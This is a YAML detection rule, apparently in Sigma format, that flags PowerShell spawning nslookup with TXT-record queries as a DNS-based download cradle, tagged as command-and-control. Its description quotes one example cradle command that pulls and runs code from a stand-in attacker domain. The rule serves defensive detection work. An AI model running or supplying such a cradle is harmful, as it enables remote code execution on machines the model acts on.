author: Zach Mathis (@yamatosecurity)
category: process_creation
date: 2022/09/06
description: This rule tries to detect powershell download cradles, e.g. powershell
  . (nslookup -q=txt http://some.owned.domain.com)[-1]
detection:
  condition: selection
  selection:
    winlog.event_data.CommandLine|contains: '=txt '
    winlog.event_data.Image|contains: nslookup
    winlog.event_data.ParentImage|endswith: \powershell.exe
id: 72671447-4352-4413-bb91-b85569687135
level: medium
logsource:
  category: process_creation
  product: windows
product: windows
references:
- https://twitter.com/alh4zr3d/status/1566489367232651264
status: experimental
tags:
- attack.command_and_control
- attack.t1105
- attack.t1071.004
title: Nslookup PwSh Download Cradle
